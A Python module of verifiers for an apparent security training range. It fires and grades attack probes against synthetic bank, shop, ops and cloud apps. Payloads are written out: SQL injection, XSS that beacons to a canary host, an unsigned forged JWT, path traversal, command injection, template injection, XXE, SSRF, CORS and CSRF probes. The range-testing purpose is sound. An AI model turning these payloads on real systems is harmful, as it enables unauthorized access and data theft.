"""Fresh deterministic verifiers for the initial Phase 1.6 vertical slices."""

from __future__ import annotations

import hashlib
import json
from enum import StrEnum
from typing import Any
from uuid import uuid4

import httpx
from pydantic import BaseModel, ConfigDict, Field

from aegis_range.inventory import RANGE_TARGETS, RangeTarget


class VerificationStatus(StrEnum):
    CONFIRMED = "CONFIRMED"
    PASS = "PASS"  # noqa: S105 - verdict label, not a password
    INCOMPLETE = "INCOMPLETE"


class VerificationResult(BaseModel):
    model_config = ConfigDict(extra="forbid")

    authority: str = "DETERMINISTIC_RANGE_VERIFIER"
    application_id: str
    scenario_id: str
    status: VerificationStatus
    complete: bool
    evidence_sha256: str = Field(pattern=r"^[a-f0-9]{64}$")
    evidence_bytes: int = Field(ge=0, le=262_144)
    facts: dict[str, bool | int | str]


class RangeVerifier:
    def __init__(
        self,
        transports: dict[str, httpx.AsyncBaseTransport] | None = None,
        service_transports: dict[str, httpx.AsyncBaseTransport] | None = None,
        *,
        use_management_origins: bool = False,
    ) -> None:
        self._transports = transports or {}
        self._service_transports = service_transports or {}
        self._use_management_origins = use_management_origins

    def _client(self, target: RangeTarget) -> httpx.AsyncClient:
        origin = target.management_origin if self._use_management_origins else target.origin
        return httpx.AsyncClient(
            base_url=origin,
            timeout=3,
            follow_redirects=False,
            trust_env=False,
            transport=self._transports.get(target.application_id),
        )

    def _service_client(self, name: str, origin: str) -> httpx.AsyncClient:
        return httpx.AsyncClient(
            base_url=origin,
            timeout=12,
            follow_redirects=False,
            trust_env=False,
            transport=self._service_transports.get(name),
        )

    def _result(
        self,
        application_id: str,
        scenario_id: str,
        status: VerificationStatus,
        evidence: bytes,
        facts: dict[str, bool | int | str],
    ) -> VerificationResult:
        verification_reference = uuid4().hex
        bounded_evidence = evidence[:262_090] + b"\nverification=" + verification_reference.encode()
        return VerificationResult(
            application_id=application_id,
            scenario_id=scenario_id,
            status=status,
            complete=status is not VerificationStatus.INCOMPLETE,
            evidence_sha256=hashlib.sha256(bounded_evidence).hexdigest(),
            evidence_bytes=len(bounded_evidence),
            facts={**facts, "verification_reference": verification_reference},
        )

    async def verify(self, application_id: str, scenario_id: str) -> VerificationResult:
        target = RANGE_TARGETS.get(application_id)
        if target is None:
            raise ValueError("TARGET_NOT_IN_RANGE_INVENTORY")
        if scenario_id == "bank-object-access-v1":
            return await self._bank(target, scenario_id)
        if scenario_id == "bank-operation-access-v1":
            return await self._bank_operation(target, scenario_id)
        if scenario_id == "bank-session-validation-v1":
            return await self._bank_token(target, scenario_id)
        if scenario_id == "bank-profile-update-v1":
            return await self._bank_profile(target, scenario_id)
        if scenario_id == "bank-recovery-response-v1":
            return await self._bank_recovery(target, scenario_id)
        if scenario_id == "bank-login-rate-limit-v1":
            return await self._bank_login_rate_limit(target, scenario_id)
        if scenario_id == "shop-catalog-query-v1":
            return await self._shop_query(target, scenario_id)
        if scenario_id == "shop-promotion-preview-v1":
            return await self._shop_preview(target, scenario_id)
        if scenario_id == "shop-review-content-v1":
            return await self._shop_stored(target, scenario_id)
        if scenario_id == "shop-preference-request-v1":
            return await self._shop_csrf(target, scenario_id)
        if scenario_id == "shop-attachment-policy-v1":
            return await self._shop_upload(target, scenario_id)
        if scenario_id == "ops-report-selection-v1":
            return await self._ops(target, scenario_id)
        if scenario_id == "ops-diagnostic-input-v1":
            return await self._ops_command(target, scenario_id)
        if scenario_id == "ops-report-preview-v1":
            return await self._ops_template(target, scenario_id)
        if scenario_id == "ops-support-status-v1":
            return await self._ops_config(target, scenario_id)
        if scenario_id == "cloud-integration-fetch-v1":
            return await self._cloud(target, scenario_id)
        if scenario_id == "cloud-xml-import-v1":
            return await self._cloud_xxe(target, scenario_id)
        if scenario_id == "cloud-workspace-sharing-v1":
            return await self._cloud_cors(target, scenario_id)
        if scenario_id == "cloud-metadata-response-v1":
            return await self._cloud_metadata(target, scenario_id)
        if scenario_id == "cloud-service-access-v1":
            return await self._cloud_internal(target, scenario_id)
        raise ValueError("SCENARIO_NOT_IN_RANGE_INVENTORY")

    async def _bank(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        headers = {"Authorization": "Bearer range-user-alex"}  # noqa: S105
        async with self._client(target) as client:
            owner = await client.get("/api/accounts/ACC-100", headers=headers)
            cross = await client.get("/api/accounts/ACC-200", headers=headers)
            transactions = await client.get("/api/accounts/ACC-200/transactions", headers=headers)
        cross_owner = False
        if cross.status_code == 200:
            try:
                cross_owner = cross.json().get("owner_id") == "USR-200"
            except (ValueError, AttributeError):
                cross_owner = False
        confirmed = owner.status_code == 200 and cross_owner and transactions.status_code == 200
        patched = (
            owner.status_code == 200
            and cross.status_code == 403
            and transactions.status_code == 403
        )
        status = (
            VerificationStatus.CONFIRMED
            if confirmed
            else VerificationStatus.PASS
            if patched
            else VerificationStatus.INCOMPLETE
        )
        evidence = owner.content + b"\n" + cross.content + b"\n" + transactions.content
        return self._result(
            target.application_id,
            scenario_id,
            status,
            evidence,
            {
                "owner_control_status": owner.status_code,
                "cross_owner_status": cross.status_code,
                "transaction_status": transactions.status_code,
                "cross_owner_identity_proved": cross_owner,
            },
        )

    async def _bank_operation(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        async with self._client(target) as client:
            admin = await client.post(
                "/api/operations/close-day",
                headers={"Authorization": "Bearer range-operator-river"},
            )
            customer = await client.post(
                "/api/operations/close-day",
                headers={"Authorization": "Bearer range-user-alex"},
            )
        confirmed = admin.status_code == customer.status_code == 200
        patched = admin.status_code == 200 and customer.status_code == 403
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            admin.content + customer.content,
            {"control_status": admin.status_code, "customer_status": customer.status_code},
        )

    async def _bank_token(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        import base64
        import json
        import time

        def enc(value: object) -> str:
            return (
                base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode())
                .rstrip(b"=")
                .decode()
            )

        forged_header = enc({"alg": "none", "typ": "JWT"})
        forged_payload = enc(
            {
                "sub": "USR-900",
                "iss": "aegis-range-issuer",
                "aud": "aegis-bank",
                "exp": int(time.time()) + 60,
            }
        )
        forged = f"{forged_header}.{forged_payload}."
        async with self._client(target) as client:
            login = await client.post(
                "/api/sessions",
                json={"username": "alex@example.test", "passcode": "synthetic-alex-pass"},
            )
            valid = await client.get(
                "/api/session/summary",
                headers={"Authorization": f"Bearer {login.json().get('access_token', '')}"},
            )
            probe = await client.get(
                "/api/session/summary", headers={"Authorization": f"Bearer {forged}"}
            )
        confirmed = (
            login.status_code == valid.status_code == probe.status_code == 200
            and probe.json().get("subject") == "USR-900"
        )
        patched = login.status_code == valid.status_code == 200 and probe.status_code == 401
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            login.content + valid.content + probe.content,
            {
                "login_status": login.status_code,
                "valid_status": valid.status_code,
                "forged_status": probe.status_code,
            },
        )

    async def _bank_profile(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        headers = {"Authorization": "Bearer range-user-alex"}
        marker = f"priority-{uuid4().hex[:8]}"
        async with self._client(target) as client:
            control = await client.patch(
                "/api/profile", headers=headers, json={"display_name": "Alex M."}
            )
            probe = await client.patch("/api/profile", headers=headers, json={"tier": marker})
        changed = probe.json().get("tier") == marker
        confirmed = control.status_code == probe.status_code == 200 and changed
        patched = control.status_code == probe.status_code == 200 and not changed
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content + probe.content,
            {
                "control_status": control.status_code,
                "probe_status": probe.status_code,
                "hidden_field_changed": changed,
            },
        )

    async def _bank_recovery(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        headers = {"X-Client-Id": "verifier-client"}
        async with self._client(target) as client:
            known = await client.post(
                "/api/access/recovery", headers=headers, json={"email": "alex@example.test"}
            )
            unknown = await client.post(
                "/api/access/recovery", headers=headers, json={"email": "nobody@example.test"}
            )
            third = await client.post(
                "/api/access/recovery", headers=headers, json={"email": "nobody2@example.test"}
            )
            fourth = await client.post(
                "/api/access/recovery", headers=headers, json={"email": "nobody3@example.test"}
            )
        different = known.content != unknown.content
        confirmed = different and fourth.status_code == 200
        patched = (
            known.status_code == unknown.status_code == third.status_code == 200
            and known.content == unknown.content
            and fourth.status_code == 429
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            known.content + unknown.content + fourth.content,
            {"responses_differ": different, "fourth_status": fourth.status_code},
        )

    async def _bank_login_rate_limit(
        self, target: RangeTarget, scenario_id: str
    ) -> VerificationResult:
        account = "alex@example.test"
        valid = {"username": account, "passcode": "synthetic-alex-pass"}
        invalid_burst = 6
        async with self._client(target) as client:
            # Reset only the account lockout/attempt counters (not the scenario mode), so the
            # control is adjudicated independently of any earlier worker attempt sequence.
            await client.post("/__control/accounts/reset")
            control = await client.post("/api/sessions", json=valid)
            invalid_statuses: list[int] = []
            invalid_content = b""
            for index in range(invalid_burst):
                probe = await client.post(
                    "/api/sessions",
                    json={"username": account, "passcode": f"invalid-verifier-{index}"},
                )
                invalid_statuses.append(probe.status_code)
                invalid_content += probe.content
                # Safety: stop immediately if an invalid credential ever authenticates.
                if probe.status_code == 200:
                    break
            post = await client.post("/api/sessions", json=valid)
        lockout_observed = 429 in invalid_statuses
        invalid_authenticated = any(status == 200 for status in invalid_statuses)
        control_usable = control.status_code == 200
        confirmed = (
            control_usable
            and not invalid_authenticated
            and not lockout_observed
            and all(status == 401 for status in invalid_statuses)
            and post.status_code == 200
        )
        patched = (
            control_usable
            and not invalid_authenticated
            and lockout_observed
            and post.status_code == 429
        )
        evidence = control.content + b"\n" + invalid_content + b"\n" + post.content
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            evidence,
            {
                "positive_control_status": control.status_code,
                "invalid_attempt_count": len(invalid_statuses),
                "rate_limit_or_lockout_observed": lockout_observed,
                "invalid_never_authenticated": not invalid_authenticated,
                "post_burst_status": post.status_code,
            },
        )

    async def adjudicate_detection_control_bypass(
        self, application_id: str, worker_evidence: dict[str, Any]
    ) -> VerificationResult:
        """Adjudicate the Phase 2.2 detection-control-bypass slice from WORKER-produced evidence.

        The verifier reads only controller-owned ground truth from the management plane (the current
        sentinel digest and whether the detection control is active). It then adjudicates the
        disposable worker's own baseline/alternate probe evidence. It never itself sends the
        baseline or alternate probe against the protected operation — it generates NO substitute
        bypass traffic — so a confirmation requires that the *worker's* alternate probe reached the
        controller-owned sentinel (its observed digest equals the controller's), not merely that a
        status code differed.
        """

        target = RANGE_TARGETS.get(application_id)
        if target is None:
            raise ValueError("TARGET_NOT_IN_RANGE_INVENTORY")
        async with self._client(target) as client:
            state = await client.get("/__control/detection/state")
        ground_truth: dict[str, Any] = state.json() if state.status_code == 200 else {}
        controller_digest = ground_truth.get("sentinel_digest")
        return self._decide_detection_control_bypass(
            application_id,
            worker_evidence,
            detection_active=bool(ground_truth.get("detection_active")),
            controller_sentinel_digest=controller_digest
            if isinstance(controller_digest, str)
            else None,
        )

    def adjudicate_detection_control_bypass_offline(
        self,
        application_id: str,
        worker_evidence: dict[str, Any],
        *,
        detection_active: bool,
        controller_sentinel_digest: str | None,
    ) -> VerificationResult:
        """Delayed adjudication from PERSISTED inputs only — no live/mutable range state, no probes.

        Identical deterministic decision as the live path, but the controller-owned ground truth
        (whether the detection control was active and the sentinel digest that was live when the
        worker probed) is supplied from the persisted campaign artifact rather than read from a live
        management plane. It generates no HTTP traffic of any kind and reconstructs nothing.
        """

        if application_id not in RANGE_TARGETS:
            raise ValueError("TARGET_NOT_IN_RANGE_INVENTORY")
        return self._decide_detection_control_bypass(
            application_id,
            worker_evidence,
            detection_active=detection_active,
            controller_sentinel_digest=controller_sentinel_digest,
        )

    def adjudicate_sqli_offline(
        self,
        application_id: str,
        worker_evidence: dict[str, Any],
        *,
        seeded_total: int,
        control_selective_count: int,
    ) -> VerificationResult:
        """Delayed SQLi adjudication from WORKER-produced evidence + controller-owned ground truth.

        The SQLi analogue of ``adjudicate_detection_control_bypass_offline``. The verifier
        sends NO SQL injection traffic of its own: it adjudicates the injection worker's normalized
        boolean-differential evidence (a benign control query, a boolean-TRUE and a boolean-FALSE
        probe) against the controller seeded ground truth. A tool's own "injectable" verdict is
        never an input — only the observed result-set differential is.

        CONFIRMED requires the benign control selective while the boolean-TRUE probe expands the
        result set to the full seeded population and the boolean-FALSE suppresses it (the query
        semantics changed). PASS requires the injection to have no effect (a parameterized query
        treats the payload as a literal, both probes returning nothing). Else INCOMPLETE.
        """

        if application_id not in RANGE_TARGETS:
            raise ValueError("TARGET_NOT_IN_RANGE_INVENTORY")
        target = RANGE_TARGETS[application_id]
        scenario_id = "shop-catalog-query-v1"

        def _slot(name: str) -> tuple[int, int]:
            slot = worker_evidence.get(name) or {}
            status = slot.get("status_code", slot.get("status", 0))
            count = slot.get("result_count", slot.get("count", -1))
            return (int(status) if isinstance(status, int) else 0,
                    int(count) if isinstance(count, int) else -1)

        control_status, control_count = _slot("control")
        true_status, true_count = _slot("boolean_true")
        false_status, false_count = _slot("boolean_false")

        control_ok = control_status == 200 and control_count == control_selective_count
        confirmed = (
            control_ok
            and true_status == 200
            and true_count == seeded_total
            and true_count > control_count
            and false_count == 0
        )
        patched = (
            control_ok
            and true_status == 200
            and true_count == 0
            and false_count == 0
        )
        evidence = json.dumps(
            {
                "ground_truth": {
                    "seeded_total": seeded_total,
                    "control_selective_count": control_selective_count,
                },
                "worker_evidence": worker_evidence,
            },
            sort_keys=True,
        ).encode()
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            evidence,
            {
                "control_status": control_status,
                "control_result_count": control_count,
                "boolean_true_result_count": true_count,
                "boolean_false_result_count": false_count,
                "result_set_differential_present": confirmed,
                "verifier_probe_requests": 0,
                "verifier_generated_injection_traffic": False,
            },
        )

    def _decide_detection_control_bypass(
        self,
        application_id: str,
        worker_evidence: dict[str, Any],
        *,
        detection_active: bool,
        controller_sentinel_digest: str | None,
    ) -> VerificationResult:
        """The single deterministic decision shared by the live and delayed adjudication paths.

        A confirmation requires that the *worker's* alternate probe reached the controller-owned
        sentinel (its observed digest equals the controller's), not merely that a status code
        differed. This function itself sends no probe against the protected operation.
        """

        target = RANGE_TARGETS[application_id]
        scenario_id = "ops-detection-control-bypass-v1"
        baseline = worker_evidence.get("baseline") or {}
        alternate = worker_evidence.get("alternate") or {}
        baseline_denied = bool(baseline.get("blocked")) and not bool(
            baseline.get("sentinel_present")
        )
        alternate_reached = (
            not bool(alternate.get("blocked"))
            and bool(alternate.get("sentinel_present"))
            and isinstance(controller_sentinel_digest, str)
            and bool(controller_sentinel_digest)
            and alternate.get("sentinel_digest") == controller_sentinel_digest
        )
        alternate_denied = bool(alternate.get("blocked")) and not bool(
            alternate.get("sentinel_present")
        )
        confirmed = detection_active and baseline_denied and alternate_reached
        patched = (
            detection_active and baseline_denied and alternate_denied and not alternate_reached
        )
        evidence = json.dumps(
            {
                "ground_truth": {
                    "detection_active": detection_active,
                    "sentinel_digest": controller_sentinel_digest,
                },
                "worker_evidence": worker_evidence,
            },
            sort_keys=True,
        ).encode()
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            evidence,
            {
                "detection_active": detection_active,
                "baseline_denied": baseline_denied,
                "alternate_reached_sentinel": alternate_reached,
                "alternate_denied": alternate_denied,
                "sentinel_effect_present": alternate_reached,
                "verifier_probe_requests": 0,
                "verifier_generated_bypass_traffic": False,
            },
        )

    def _binary(
        self,
        target: RangeTarget,
        scenario_id: str,
        confirmed: bool,
        patched: bool,
        evidence: bytes,
        facts: dict[str, bool | int | str],
    ) -> VerificationResult:
        status = (
            VerificationStatus.CONFIRMED
            if confirmed
            else VerificationStatus.PASS
            if patched
            else VerificationStatus.INCOMPLETE
        )
        return self._result(target.application_id, scenario_id, status, evidence, facts)

    async def _shop_query(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        async with self._client(target) as client:
            control = await client.get("/api/products", params={"q": "Notebook"})
            probe = await client.get("/api/products", params={"q": "%' OR 1=1 --"})
        try:
            control_rows = control.json()["products"]
            probe_rows = probe.json()["products"]
        except (ValueError, KeyError, TypeError):
            control_rows, probe_rows = [], []
        control_ok = control.status_code == 200 and len(control_rows) == 1
        confirmed = control_ok and probe.status_code == 200 and len(probe_rows) == 3
        patched = control_ok and probe.status_code == 200 and len(probe_rows) == 0
        status = (
            VerificationStatus.CONFIRMED
            if confirmed
            else VerificationStatus.PASS
            if patched
            else VerificationStatus.INCOMPLETE
        )
        return self._result(
            target.application_id,
            scenario_id,
            status,
            control.content + b"\n" + probe.content,
            {
                "control_status": control.status_code,
                "control_result_count": len(control_rows),
                "probe_status": probe.status_code,
                "probe_result_count": len(probe_rows),
            },
        )

    async def _shop_preview(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        marker = '<script data-range="proof">window.rangeCheck=1</script>'
        async with self._client(target) as client:
            control = await client.get("/api/promotions/preview", params={"message": "Autumn sale"})
            probe = await client.get("/api/promotions/preview", params={"message": marker})
        raw = marker.encode() in probe.content
        encoded = b"&lt;script data-range=&quot;proof&quot;&gt;" in probe.content
        control_ok = control.status_code == 200 and b"Autumn sale" in control.content
        status = (
            VerificationStatus.CONFIRMED
            if control_ok and raw
            else VerificationStatus.PASS
            if control_ok and encoded and not raw
            else VerificationStatus.INCOMPLETE
        )
        return self._result(
            target.application_id,
            scenario_id,
            status,
            control.content + b"\n" + probe.content,
            {
                "control_status": control.status_code,
                "probe_status": probe.status_code,
                "raw_html_context": raw,
                "contextually_encoded": encoded,
            },
        )

    async def _shop_stored(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        nonce = uuid4().hex[:16]
        script = (
            "<script>new Image().src='http://shop-effect-canary:8800/effect/" + nonce + "'</script>"
        )
        async with self._service_client(
            "shop-canary", "http://shop-effect-canary-control:8800"
        ) as canary:
            await canary.post("/__control/reset")
        async with self._client(target) as client:
            control = await client.post(
                "/api/reviews", json={"product_id": "PRD-100", "content": "Useful notebook"}
            )
            probe = await client.post(
                "/api/reviews", json={"product_id": "PRD-100", "content": script}
            )
        async with self._service_client("shop-browser", "http://shop-browser:8650") as browser:
            viewed = await browser.post(
                "/v1/view", json={"url": "http://aegis-shop-view:8102/internal/reviews/view"}
            )
        async with self._service_client(
            "shop-canary", "http://shop-effect-canary-control:8800"
        ) as canary:
            effect = await canary.get(f"/__control/effects/{nonce}")
        observed = effect.status_code == 200 and effect.json().get("observed") is True
        confirmed = (
            control.status_code == probe.status_code == viewed.status_code == 200 and observed
        )
        patched = (
            control.status_code == probe.status_code == viewed.status_code == 200 and not observed
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content + probe.content + viewed.content + effect.content,
            {
                "control_status": control.status_code,
                "browser_status": viewed.status_code,
                "fresh_effect": observed,
            },
        )

    async def _shop_csrf(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        async with self._client(target) as client:
            form = await client.get("/api/profile/form")
            token = form.json().get("csrf_token", "")
            normal = await client.post(
                "/api/profile/preferences",
                cookies={"shop_session": "synthetic-shop-session"},
                headers={"Origin": "http://aegis-shop:8102", "X-CSRF-Token": token},
                json={"newsletter": True},
            )
            cross = await client.post(
                "/api/profile/preferences",
                cookies={"shop_session": "synthetic-shop-session"},
                headers={"Origin": "https://untrusted.invalid"},
                json={"newsletter": False},
            )
        confirmed = form.status_code == normal.status_code == cross.status_code == 200
        patched = form.status_code == normal.status_code == 200 and cross.status_code == 403
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            form.content + normal.content + cross.content,
            {"normal_status": normal.status_code, "cross_site_status": cross.status_code},
        )

    async def _shop_upload(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        benign = b"Synthetic support attachment\n"
        active = b"<html><script>window.syntheticUpload=1</script></html>"
        async with self._client(target) as client:
            control = await client.post(
                "/api/attachments",
                content=benign,
                headers={"X-Filename": "notes.txt", "Content-Type": "text/plain"},
            )
            probe = await client.post(
                "/api/attachments",
                content=active,
                headers={"X-Filename": "invoice.html", "Content-Type": "text/html"},
            )
            fetched = None
            if probe.status_code == 200:
                fetched = await client.get(f"/api/attachments/{probe.json()['attachment_id']}")
        confirmed = (
            probe.status_code == 200
            and fetched is not None
            and fetched.headers.get("content-disposition", "").startswith("inline")
            and b"<script" in fetched.content
        )
        patched = control.status_code == 200 and probe.status_code == 400
        evidence = (
            control.content + probe.content + (fetched.content if fetched is not None else b"")
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            evidence,
            {
                "control_status": control.status_code,
                "active_status": probe.status_code,
                "inline_rendering": confirmed,
            },
        )

    async def _ops(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        async with self._client(target) as client:
            control = await client.get(
                "/api/reports/download", params={"file": "daily-summary.txt"}
            )
            probe = await client.get(
                "/api/reports/download", params={"file": "../archive/quarterly.txt"}
            )
        marker = b"AEGIS_RANGE_ARCHIVE_2026_Q1"
        control_ok = control.status_code == 200 and b"Daily Operations Summary" in control.content
        confirmed = control_ok and probe.status_code == 200 and marker in probe.content
        patched = control_ok and probe.status_code == 404 and marker not in probe.content
        status = (
            VerificationStatus.CONFIRMED
            if confirmed
            else VerificationStatus.PASS
            if patched
            else VerificationStatus.INCOMPLETE
        )
        return self._result(
            target.application_id,
            scenario_id,
            status,
            control.content + b"\n" + probe.content,
            {
                "control_status": control.status_code,
                "probe_status": probe.status_code,
                "synthetic_archive_proved": marker in probe.content,
            },
        )

    async def _ops_command(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        reference = uuid4().hex[:16]
        payload = f"service; touch canary-{reference}"
        async with self._service_client("ops-worker", "http://ops-worker-control:8600") as worker:
            await worker.post("/__control/reset")
        async with self._client(target) as client:
            control = await client.post(
                "/api/diagnostics/run",
                json={"target": "service.local", "reference": "control-check"},
            )
            probe = await client.post(
                "/api/diagnostics/run", json={"target": payload, "reference": reference}
            )
        async with self._service_client("ops-worker", "http://ops-worker-control:8600") as worker:
            effect = await worker.get(f"/__control/effects/{reference}")
        observed = effect.status_code == 200 and effect.json().get("observed") is True
        confirmed = control.status_code == probe.status_code == 200 and observed
        patched = control.status_code == 200 and probe.status_code in {400, 502} and not observed
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content + probe.content + effect.content,
            {
                "control_status": control.status_code,
                "probe_status": probe.status_code,
                "fresh_worker_effect": observed,
            },
        )

    async def _ops_template(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        left = int(uuid4().hex[:2], 16) % 20 + 2
        right = int(uuid4().hex[2:4], 16) % 20 + 2
        expression = f"{{{{ {left} * {right} }}}}"
        async with self._client(target) as client:
            control = await client.post("/api/reports/preview", json={"content": "Daily report"})
            probe = await client.post("/api/reports/preview", json={"content": expression})
        calculated = str(left * right)
        confirmed = (
            control.status_code == probe.status_code == 200
            and probe.json().get("preview") == calculated
        )
        patched = (
            control.status_code == probe.status_code == 200
            and expression in probe.json().get("preview", "")
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content + probe.content,
            {
                "control_status": control.status_code,
                "calculation_observed": confirmed,
                "literal_observed": patched,
            },
        )

    async def _ops_config(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        async with self._client(target) as client:
            response = await client.get("/api/support/status")
        value = (
            response.json().get("configuration_reference", "")
            if response.status_code == 200
            else ""
        )
        exposed = isinstance(value, str) and len(value) == 28 and value != "redacted"
        patched = response.status_code == 200 and value == "redacted"
        return self._binary(
            target,
            scenario_id,
            exposed,
            patched,
            response.content,
            {"status": response.status_code, "synthetic_value_exposed": exposed},
        )

    async def _cloud(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        control_url = "https://status.partner.invalid/health"
        canary_url = "http://range-canary:8500/status/instance"
        async with self._client(target) as client:
            control = await client.post("/api/integrations/check", json={"url": control_url})
            probe = await client.post("/api/integrations/check", json={"url": canary_url})
        marker = b"AEGIS_RANGE_CANARY_2026_01"
        control_ok = control.status_code == 200 and control.json().get("reachable") is True
        confirmed = control_ok and probe.status_code == 200 and marker in probe.content
        patched = control_ok and probe.status_code == 400 and marker not in probe.content
        status = (
            VerificationStatus.CONFIRMED
            if confirmed
            else VerificationStatus.PASS
            if patched
            else VerificationStatus.INCOMPLETE
        )
        return self._result(
            target.application_id,
            scenario_id,
            status,
            control.content + b"\n" + probe.content,
            {
                "control_status": control.status_code,
                "probe_status": probe.status_code,
                "synthetic_canary_proved": marker in probe.content,
                "destination_exact": True,
            },
        )

    async def _cloud_xxe(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        benign = "<integration><name>Catalog Feed</name></integration>"
        probe = '<!DOCTYPE integration [<!ENTITY resource SYSTEM "file:///fixtures/cloud/resource.txt">]><integration><name>&resource;</name></integration>'
        async with self._client(target) as client:
            control = await client.post("/api/imports/xml", json={"document": benign})
            attack = await client.post("/api/imports/xml", json={"document": probe})
        marker = b"AEGIS_RANGE_XML_RESOURCE_2026"
        confirmed = control.status_code == attack.status_code == 200 and marker in attack.content
        patched = (
            control.status_code == 200
            and attack.status_code == 400
            and marker not in attack.content
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content + attack.content,
            {
                "control_status": control.status_code,
                "probe_status": attack.status_code,
                "local_fixture": marker in attack.content,
            },
        )

    async def _cloud_cors(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        trusted = "https://portal.aegis.invalid"
        untrusted = f"https://{uuid4().hex[:10]}.invalid"
        async with self._client(target) as client:
            client.cookies.set("cloud_session", "synthetic-cloud-session")
            control = await client.get("/api/workspaces/current", headers={"Origin": trusted})
            preflight = await client.options(
                "/api/workspaces/current",
                headers={"Origin": untrusted, "Access-Control-Request-Method": "GET"},
            )
            actual = await client.get("/api/workspaces/current", headers={"Origin": untrusted})
        reflected = (
            preflight.headers.get("access-control-allow-origin") == untrusted
            and actual.headers.get("access-control-allow-origin") == untrusted
        )
        confirmed = (
            control.status_code == 200
            and reflected
            and actual.headers.get("access-control-allow-credentials") == "true"
        )
        patched = (
            control.headers.get("access-control-allow-origin") == trusted
            and not reflected
            and "access-control-allow-origin" not in actual.headers
        )
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            control.content
            + actual.content
            + str(sorted(preflight.headers.items())).encode()
            + str(sorted(actual.headers.items())).encode(),
            {"trusted_status": control.status_code, "untrusted_reflected": reflected},
        )

    async def _metadata_response(self, target: RangeTarget) -> tuple[httpx.Response, str]:
        async with self._client(target) as client:
            response = await client.post(
                "/api/integrations/check", json={"url": "http://range-canary:8500/status/instance"}
            )
        token = ""
        if response.status_code == 200:
            token = str(response.json().get("result", {}).get("access_token", ""))
        return response, token

    async def _cloud_metadata(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        response, token = await self._metadata_response(target)
        exposed = response.status_code == 200 and token.startswith("meta.")
        patched = response.status_code == 200 and token == ""
        return self._binary(
            target,
            scenario_id,
            exposed,
            patched,
            response.content,
            {"status": response.status_code, "fresh_credential_exposed": exposed},
        )

    async def _cloud_internal(self, target: RangeTarget, scenario_id: str) -> VerificationResult:
        metadata, token = await self._metadata_response(target)
        async with self._client(target) as client:
            control = await client.get("/api/operations/summary")
            probe = await client.post("/api/integrations/execute", json={"access_token": token})
        confirmed = (
            metadata.status_code == control.status_code == probe.status_code == 200
            and b"ADMIN-EFFECT" in probe.content
        )
        patched = metadata.status_code == control.status_code == 200 and probe.status_code == 403
        return self._binary(
            target,
            scenario_id,
            confirmed,
            patched,
            metadata.content + control.content + probe.content,
            {
                "control_status": control.status_code,
                "metadata_status": metadata.status_code,
                "internal_status": probe.status_code,
            },
        )


def result_json(result: VerificationResult) -> dict[str, Any]:
    return result.model_dump(mode="json")
